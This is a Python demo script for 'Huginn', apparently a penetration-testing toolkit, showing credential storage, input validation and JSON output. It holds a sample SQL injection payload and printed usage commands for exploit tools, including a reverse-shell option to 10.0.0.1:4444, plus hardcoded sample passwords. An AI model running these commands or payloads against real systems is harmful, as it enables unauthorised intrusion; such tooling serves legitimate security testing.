#!/usr/bin/env python3
"""
Example usage of the improved Huginn tools with security enhancements
"""

from credential_manager import CredentialManager
from input_validator import InputValidator

def setup_credentials():
    """Example of setting up secure credentials"""
    cred_manager = CredentialManager()
    
    # Store credentials securely (encrypted)
    cred_manager.store_credential('mssql', 'sa', 'SecurePassword123!')
    cred_manager.store_credential('mysql', 'root', 'MySecretPassword')
    
    print("Credentials stored securely")

def validate_inputs():
    """Example of input validation"""
    validator = InputValidator()
    
    # Test IP validation
    test_ips = ['192.168.1.1', '10.0.0.1', '999.999.999.999', 'invalid']
    for ip in test_ips:
        result = validator.validate_ip(ip)
        print(f"IP {ip}: {'Valid' if result else 'Invalid'}")
    
    # Test port validation
    test_ports = [80, 443, 65535, 65536, -1, 'abc']
    for port in test_ports:
        result = validator.validate_port(port)
        print(f"Port {port}: {'Valid' if result else 'Invalid'}")
    
    # Test hash validation
    test_hashes = [
        ('5d41402abc4b2a76b9719d911017c592', 'md5'),
        ('aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d', 'sha1'),
        ('invalid_hash', 'md5')
    ]
    for hash_val, hash_type in test_hashes:
        result = validator.validate_hash(hash_val, hash_type)
        print(f"Hash {hash_val[:16]}... ({hash_type}): {'Valid' if result else 'Invalid'}")

def demonstrate_structured_output():
    """Example of structured output formats"""
    print("\n=== Structured Output Examples ===")
    
    # Text output (default)
    print("Text format:")
    print("[+] Success message")
    print("[-] Error message")
    print("[*] Info message")
    
    # JSON output example
    import json
    results = [
        {
            'type': 'success',
            'message': 'SQL injection detected',
            'timestamp': '2024-01-01T12:00:00',
            'data': {
                'payload': "' OR 1=1 --",
                'url': 'http://example.com/page?id=1',
                'error': 'mysql_fetch_array'
            }
        }
    ]
    
    print("\nJSON format:")
    print(json.dumps(results, indent=2))

if __name__ == "__main__":
    print("=== Huginn Security Improvements Demo ===\n")
    
    print("1. Setting up secure credentials...")
    setup_credentials()
    
    print("\n2. Input validation examples...")
    validate_inputs()
    
    print("\n3. Structured output examples...")
    demonstrate_structured_output()
    
    print("\n=== Environment Variable Usage ===")
    print("Set credentials via environment variables:")
    print("export MSSQL_USERNAME=sa")
    print("export MSSQL_PASSWORD=password")
    print("export MYSQL_USERNAME=root")
    print("export MYSQL_PASSWORD=password")
    
    print("\n=== Tool Usage Examples ===")
    print("# JSON output:")
    print("python os_exploits.py 192.168.1.1 --reverse-shell 10.0.0.1:4444 --output json")
    print("\n# XML output:")
    print("python db_attacks.py http://example.com --sql-inject --output xml")
    print("\n# Verbose mode:")
    print("python nse_vuln_scanner.py 192.168.1.1 --all --verbose")